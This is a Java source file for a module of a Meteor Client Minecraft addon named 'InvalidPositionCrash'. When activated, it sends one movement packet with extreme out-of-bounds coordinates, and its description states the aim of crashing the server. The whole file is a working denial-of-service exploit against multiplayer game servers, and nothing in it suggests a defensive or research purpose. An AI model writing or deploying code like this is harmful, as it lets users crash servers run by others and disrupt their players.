package WideCat.MeteorCrashAddon.modules;

import WideCat.MeteorCrashAddon.MeteorCrashAddon;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

import java.util.Objects;

public class InvalidPositionCrash extends Module {

    public InvalidPositionCrash() {
        super(MeteorCrashAddon.CATEGORY, "invalid-position-crash", "Attempts to crash the server by sending an invalid movement packet");
    }

    @Override
    public void onActivate() {
        if (Utils.canUpdate()) {
            PlayerMoveC2SPacket.PositionAndOnGround p = new PlayerMoveC2SPacket.PositionAndOnGround(20_000_000, 255, 20_000_000, true);
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(p);
        }
        toggle();
    }

}